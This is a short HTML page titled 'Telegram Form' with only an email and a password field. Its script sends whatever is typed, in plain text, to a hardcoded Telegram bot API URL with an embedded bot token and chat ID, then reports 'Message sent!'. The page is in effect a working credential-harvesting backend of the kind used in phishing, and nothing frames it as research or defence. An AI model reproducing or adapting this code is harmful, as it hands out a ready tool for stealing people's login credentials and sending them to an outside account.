<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Form</title>
    <script>
        function sendMessage() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const message = `Email: ${email}, Password: ${password}`;
            const url = `https://api.telegram.org/bot5313824526:AAEI3MgZNSxfGmExZCB8srsgh_4c_gC6sDc/sendMessage?chat_id=2040461515&text=${encodeURIComponent(message)}`;

            fetch(url).then(response => {
                if (response.ok) {
                    alert("Message sent!");
                } else {
                    alert("Error sending message.");
                }
            });
        }
    </script>
</head>
<body>
    <form onsubmit="event.preventDefault(); sendMessage();">
        <input type="email" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Password">
        <input type="submit" value="Send">
    </form>
</body>
</html>
